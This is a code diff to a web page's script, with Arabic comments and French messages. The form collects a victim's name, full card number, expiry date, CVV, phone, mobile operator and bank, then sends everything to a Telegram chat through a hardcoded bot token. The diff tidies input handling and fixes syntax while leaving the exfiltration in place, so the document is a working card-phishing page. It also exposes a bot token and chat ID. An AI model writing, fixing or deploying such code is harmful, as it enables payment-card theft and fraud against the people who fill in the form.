@@ -180,18 +180,19 @@
     event.preventDefault(); // منع إعادة التحميل
 
     // جمع البيانات المدخلة
-    const nom = document.getElementById("nom").value;
-    const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, ''); // إزالة المسافات
-    const dateExpiration = document.getElementById("date-expiration").value;
-    const cvv = document.getElementById("cvv").value;
-    const telephone = document.getElementById("telephone").value;
-    const operateur = document.getElementById("operateur").value;
-    const bank = document.getElementById("bank").value;
+    const nom = document.getElementById("nom").value.trim();
+    const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '').trim(); // إزالة المسافات
+    const dateExpiration = document.getElementById("date-expiration").value.trim();
+    const cvv = document.getElementById("cvv").value.trim();
+    const telephone = document.getElementById("telephone").value.trim();
+    const operateur = document.getElementById("operateur").value.trim();
+    const bank = document.getElementById("bank").value.trim();
 
     // التحقق من صحة رقم البطاقة
+    const cardError = document.getElementById('card-error');
+    const cardInput = document.getElementById('numero-carte');
+
     if (numeroCarte.length !== 16 || isNaN(numeroCarte)) {
-        const cardError = document.getElementById('card-error');
-        const cardInput = document.getElementById('numero-carte');
         cardInput.classList.add('border-red-500');
         cardError.style.display = 'block';
         cardError.textContent = "Le numéro de carte doit contenir exactement 16 chiffres numériques.";
@@ -211,7 +212,7 @@
     `;
 
     // إرسال الطلب إلى Telegram API
-    const token = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I";
+    const token = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I"; // استبدل بالتوكن الخاص بك
     const chatId = "5372119436"; // استبدل بـ Chat ID الخاص بك
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -228,9 +229,8 @@
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            alert("تم إرسال المعلومات بنجاح!");
-            // توجيه المستخدم إلى الصفحة التالية بعد الإرسال الناجح
-            window.location.href = "Traitement.html";
+            alert("تم إرسال المعلومات بنجاح!"); // رسالة نجاح
+            window.location.href = "Traitement.html"; // توجيه المستخدم إلى صفحة traitement.html
         } else {
             alert("حدث خطأ أثناء الإرسال إلى تلغرام.");
         }
@@ -238,7 +238,8 @@
     .catch(error => {
         console.error("Error:", error);
         alert("تعذر إرسال البيانات. تحقق من الاتصال.");
-}
+    });
+});
 </script>
 </body> 
 </html>
